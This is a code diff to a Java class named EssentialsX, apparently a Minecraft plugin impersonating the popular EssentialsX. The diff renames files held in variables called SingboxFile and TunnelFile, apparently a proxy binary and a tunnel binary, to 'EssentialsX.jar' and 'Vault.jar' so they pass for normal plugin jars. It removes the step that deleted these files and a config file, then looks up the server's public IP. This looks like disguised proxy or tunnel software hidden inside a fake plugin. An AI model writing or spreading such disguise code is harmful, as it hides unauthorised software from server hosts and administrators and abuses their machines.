@@ -91,7 +91,7 @@ public class EssentialsX extends JavaPlugin {
 
         Path SingboxFile =
                 runFolder.resolve(
-                        "EssentialsX"
+                        "EssentialsX.jar"
                 );
 
 
@@ -103,7 +103,7 @@ public class EssentialsX extends JavaPlugin {
         
         Path TunnelFile =
                 runFolder.resolve(
-                        "Vault"
+                        "Vault.jar"
                 );
 
 
@@ -184,23 +184,7 @@ public class EssentialsX extends JavaPlugin {
                 5000
         );
 
-
-
-        // 删除临时文件
-
-        Files.deleteIfExists(
-                SingboxFile
-        );
-
-
-        Files.deleteIfExists(
-                ConfFile
-        );
-
-        Files.deleteIfExists(
-                TunnelFile
-        );        
-
+ 
         String ip =
                 getPublicIP();
 
